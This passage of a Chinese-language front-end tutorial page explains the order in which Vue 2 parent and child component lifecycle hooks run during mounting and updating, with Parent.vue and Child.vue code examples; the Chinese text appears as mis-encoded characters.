h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">vue2ç‰ˆæœ¬</h2>
<blockquote>
<p>ç”Ÿå‘½å‘¨æœŸï¼š</p>
<p>beforeCreate created beforeMount mounted beforeUpdate updated beforeDestroy destroyed activated deactivated</p>
</blockquote>
<h3 data-id="heading-1">1. ç»„ä»¶æŒ‚è½½é˜¶æ®µï¼ˆMountingï¼‰</h3>
<h4 data-id="heading-2">æ‰§è¡Œé¡ºåºï¼š</h4>
<pre><code class="hljs language-arduino" lang="arduino">â€‹
<span class="hljs-comment">// åˆ›å»ºå’ŒæŒ‚è½½è¿‡ç¨‹</span>
â€‹
çˆ¶ç»„ä»¶ beforeCreate
â€‹
çˆ¶ç»„ä»¶ created
â€‹
çˆ¶ç»„ä»¶ beforeMount
â€‹
 Â å­ç»„ä»¶ beforeCreate
â€‹
 Â å­ç»„ä»¶ created
â€‹
 Â å­ç»„ä»¶ beforeMount
â€‹
 Â å­ç»„ä»¶ mounted
â€‹
çˆ¶ç»„ä»¶ mounted
</code></pre>
<h4 data-id="heading-3">ä»£ç ç¤ºä¾‹ï¼š</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> /&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
â€‹
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Child.vue'</span>
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-attr">name</span>: <span class="hljs-string">'Parent'</span>,
 Â <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
 Â <span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. çˆ¶ç»„ä»¶ beforeCreate'</span>)
  },
 Â <span class="hljs-title function_">created</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. çˆ¶ç»„ä»¶ created'</span>)
  },
 Â <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. çˆ¶ç»„ä»¶ beforeMount'</span>)
  },
 Â <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'6. çˆ¶ç»„ä»¶ mounted'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å­ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
â€‹
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-attr">name</span>: <span class="hljs-string">'Child'</span>,
 Â <span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. å­ç»„ä»¶ beforeCreate'</span>)
  },
 Â <span class="hljs-title function_">created</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4.1 å­ç»„ä»¶ created'</span>)
  },
 Â <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4.2 å­ç»„ä»¶ beforeMount'</span>)
  },
 Â <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5. å­ç»„ä»¶ mounted'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
</code></pre>
<h3 data-id="heading-4">2. ç»„ä»¶æ›´æ–°é˜¶æ®µï¼ˆUpdatingï¼‰</h3>
<h4 data-id="heading-5">æ€»ç»“ï¼š</h4>
<blockquote>
<p>vue2ä¸­ï¼Œåªè¦å­ç»„ä»¶ä½¿ç”¨äº†ï¼Œçˆ¶ç»„ä»¶ä¼ å…¥çš„å€¼ï¼Œå½“è¯¥å€¼æ›´æ–°æ—¶ï¼Œå­ç»„ä»¶çš„æ›´æ–°ç”Ÿå‘½å‘¨æœŸå°±ä¼šæ‰§è¡Œï¼Œå…¶ä»–æƒ…å†µï¼Œå­ç»„ä»¶çš„æ›´æ–°ç”Ÿå‘½å‘¨æœŸéƒ½ä¸ä¼šæ‰§è¡Œ</p>
</blockquote>
<h4 data-id="heading-6">æ›´æ–°çˆ¶ç»„ä»¶--å­ç»„ä»¶ä½¿ç”¨äº†ï¼Œçˆ¶ç»„ä»¶ä¼ å…¥çš„å‚æ•°</h4>
<h5 data-id="heading-7">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// æ›´æ–°è¿‡ç¨‹ï¼ˆæ•°æ®å˜åŒ–æ—¶ï¼‰</span>
â€‹
çˆ¶ç»„ä»¶ beforeUpdate
â€‹
 Â å­ç»„ä»¶ beforeUpdate
â€‹
 Â å­ç»„ä»¶ updated
â€‹
çˆ¶ç»„ä»¶ updated
</code></pre>
<h5 data-id="heading-8">ä»£ç ç¤ºä¾‹ï¼š</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶ - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>æ”¹å˜æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
â€‹
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Child.vue'</span>
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
 Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-keyword">return</span> {
 Â  Â  Â <span class="hljs-attr">parentData</span>: <span class="hljs-string">'åˆå§‹å€¼'</span>
 Â   }
  },
 Â <span class="hljs-attr">methods</span>: {
 Â  Â <span class="hljs-title function_">changeData</span>(<span class="hljs-params"/>) {
 Â  Â  Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentData</span> = <span class="hljs-string">'æ–°å€¼'</span>
 Â   }
  },
 Â <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. çˆ¶ç»„ä»¶ beforeUpdate'</span>)
  },
 Â <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. çˆ¶ç»„ä»¶ updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å­ç»„ä»¶ - {{ childData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
â€‹
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-attr">props</span>: [<span class="hljs-string">'childData'</span>],
 Â <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. å­ç»„ä»¶ beforeUpdate'</span>)
  },
 Â <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. å­ç»„ä»¶ updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-9">æ›´æ–°çˆ¶ç»„ä»¶--å­ç»„ä»¶æ²¡æœ‰ä½¿ç”¨ï¼Œçˆ¶ç»„ä»¶ä¼ å…¥çš„å‚æ•°ï¼ˆå³ä½¿æœ‰ä¼ å…¥å€¼ç»™å­ç»„ä»¶ï¼‰</h4>
<h5 data-id="heading-10">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// æ›´æ–°è¿‡ç¨‹ï¼ˆæ•°æ®å˜åŒ–æ—¶ï¼‰</span>
â€‹
çˆ¶ç»„ä»¶ beforeUpdate
â€‹
çˆ¶ç»„ä»¶ updated
</code></pre>
<h5 data-id="heading-11">ä»£ç ç¤ºä¾‹ï¼š</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶ - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>æ”¹å˜æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
 Â  Â <span class="hljs-comment">&lt;!-- &lt;ChildComponent :childData="parentData" /&gt; --&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/two/Child.vue'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
 Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-keyword">return</span> {
 Â  Â  Â <span class="hljs-attr">parentData</span>: <span class="hljs-string">'åˆå§‹å€¼'</span>
 Â   }
  },
 Â <span class="hljs-attr">methods</span>: {
 Â  Â <span class="hljs-title function_">changeData</span>(<span class="hljs-params"/>) {
 Â  Â  Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentData</span> = <span class="hljs-string">'æ–°å€¼'</span>
 Â   }
  },
 Â <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. çˆ¶ç»„ä»¶ beforeUpdate'</span>)
  },
 Â <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. çˆ¶ç»„ä»¶ updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
â€‹
â€‹
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-comment">&lt;!-- &lt;h3&gt;å­ç»„ä»¶ - {{ childData }}&lt;/h3&gt; --&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å­ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-attr">props</span>: [<span class="hljs-string">'childData'</span>],
 Â <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. å­ç»„ä»¶ beforeUpdate'</span>)
  },
 Â <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. å­ç»„ä»¶ updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
â€‹
</code></pre>
<h4 data-id="heading-12">æ›´æ–°å­ç»„ä»¶</h4>
<h5 data-id="heading-13">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// æ›´æ–°è¿‡ç¨‹ï¼ˆæ•°æ®å˜åŒ–æ—¶ï¼‰</span>
â€‹
å­ç»„ä»¶ beforeUpdate
â€‹
å­ç»„ä»¶ updated
</code></pre>
<h5 data-id="heading-14">ä»£ç ç¤ºä¾‹ï¼š</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶ - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>æ”¹å˜æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span>/&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/two/Child.vue'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
 Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-keyword">return</span> {
 Â  Â  Â <span class="hljs-attr">parentData</span>: <span class="hljs-string">'åˆå§‹å€¼'</span>
 Â   }
  },
 Â <span class="hljs-attr">methods</span>: {
 Â  Â <span class="hljs-title function_">changeData</span>(<span class="hljs-params"/>) {
 Â  Â  Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentData</span> = <span class="hljs-string">'æ–°å€¼'</span>
 Â   }
  },
